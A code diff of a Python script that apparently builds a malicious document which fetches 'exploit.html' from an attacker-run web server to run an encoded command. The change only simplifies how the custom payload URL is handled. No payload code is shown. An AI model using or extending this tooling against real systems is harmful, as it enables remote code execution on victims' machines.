@@ -5,7 +5,6 @@ import zipfile
 import http.server
 import socketserver
 import base64
-from urllib.parse import urlparse
 
 # Helper function to zip whole dir
 # https://stackoverflow.com/questions/1855095/how-to-create-a-zip-archive-of-a-directory
@@ -34,7 +33,7 @@ if __name__ == "__main__":
     command.add_argument('-c', '--command', action='store', dest='command',
         help='The encoded command to execute in "command" mode')
     optional.add_argument('-u', '--url', action='store', dest='url', default='localhost',
-        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"')
+        help='The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost". If specifying a custom host, you must include the protocol and port.')
     optional.add_argument('-H', '--host', action='store', dest='host', default="0.0.0.0",
         help='The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)')
     optional.add_argument('-P', '--port', action='store', dest='port', default=80, type=int,
@@ -50,14 +49,8 @@ if __name__ == "__main__":
 
     payload_url = f"http://{args.url}:{args.port}/exploit.html"
 
-    if args.url != "localhost":
-        url = urlparse(args.url)
-        if url.scheme == "":
-            raise SystemExit("Custom host mode requires HTTP or HTTPS, e.g. http://example.com")
-        elif url.scheme == "http":
-            payload_url = f"{args.url}:80"
-        elif url.scheme == "https":
-            payload_url = f"{args.url}:443"
+    if args.url != "localhost":  # if not default URL
+        payload_url = f"{args.url}"  # payload_url is defined as-is by the user, user must specify protocol and port
 
     print(payload_url)
 
